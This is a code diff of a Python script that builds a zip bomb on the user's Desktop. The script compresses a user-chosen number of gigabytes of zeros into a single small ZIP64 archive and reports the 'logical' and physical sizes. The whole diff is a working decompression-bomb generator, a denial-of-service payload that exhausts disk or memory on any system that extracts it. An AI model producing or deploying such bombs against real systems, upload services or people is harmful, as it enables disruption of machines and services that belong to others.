@@ -1,24 +1,34 @@
 import zipfile
 import os
+import time
 from pathlib import Path
 
-def create_flat_25gb_bomb():
-    desktop_path = Path.home() / "Desktop"
-    final_zip = desktop_path / "zip_bomb_flat.zip"
-
-    # 25GB calculation
-    target_gb = 25
-    total_bytes = target_gb * 1024 * 1024 * 1024
-    chunk_size = 1024 * 1024  # 1MB of '0's at a time
-
-    print(f"Creating a ZIP containing ONE {target_gb}GB file...")
-    print("This will take a minute because the CPU has to compress the stream...")
-
+def create_zip_bob():
+    # 1. Ask for the size (No hardcoded numbers this time)
+    user_input = input("Enter how many GB you want the final file to be: ")
     try:
-        # ZIP64 is 100% required for a single file over 4GB
+        target_gb = float(user_input)
+    except ValueError:
+        print("Error: Please enter a number only.")
+        return
+
+    # 2. Setup paths
+    desktop_path = Path.home() / "Desktop"
+    final_zip = desktop_path / "zip_bomb.zip"
+
+    # Exact math: 1024^3 bytes per GB
+    total_bytes = int(target_gb * 1024 * 1024 * 1024)
+    chunk_size = 1024 * 1024  # 1MB buffer
+    
+    start_time = time.time()
+
+    print(f"\nCompiling... Target: {target_gb} GB")
+    
+    try:
+        # allowZip64 handles files over 4GB
         with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
             
-            # We open ONE internal file named 'huge_data.txt'
+            # This creates the ONE big file inside the zip
             with zf.open('huge_data.txt', 'w', force_zip64=True) as f:
                 written = 0
                 dummy_data = b'0' * chunk_size
@@ -27,18 +37,24 @@ def create_flat_25gb_bomb():
                     f.write(dummy_data)
                     written += chunk_size
                     
-                    # Progress bar so you know it hasn't frozen
+                    # Updates every 1GB so you know it's working
                     if written % (1024 * 1024 * 1024) == 0:
-                        print(f"Compressed: {written // (1024**3)} GB / {target_gb} GB")
+                        print(f"Status: {written // (1024**3)} / {int(target_gb)} GB compressed...")
 
+        end_time = time.time()
+        duration = end_time - start_time
         physical_size = os.path.getsize(final_zip) / (1024 * 1024)
-        print("\n--- COMPILATION SUCCESS ---")
-        print(f"File on Desktop: {final_zip}")
-        print(f"Zipped Size: {physical_size:.2f} MiB")
-        print(f"Unzipped Size: {target_gb} GB (as ONE file)")
+
+        print("\n" + "="*40)
+        print(f"ZIP BOB COMPILER SUCCESS")
+        print(f"Final File:    {final_zip}")
+        print(f"Logical Size:  {target_gb} GB")
+        print(f"Physical Size: {physical_size:.2f} MiB")
+        print(f"Time Taken:    {duration:.2f} seconds")
+        print("="*40)
 
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Compiler Error: {e}")
 
 if __name__ == "__main__":
-    create_flat_25gb_bomb()
+    create_zip_bob()
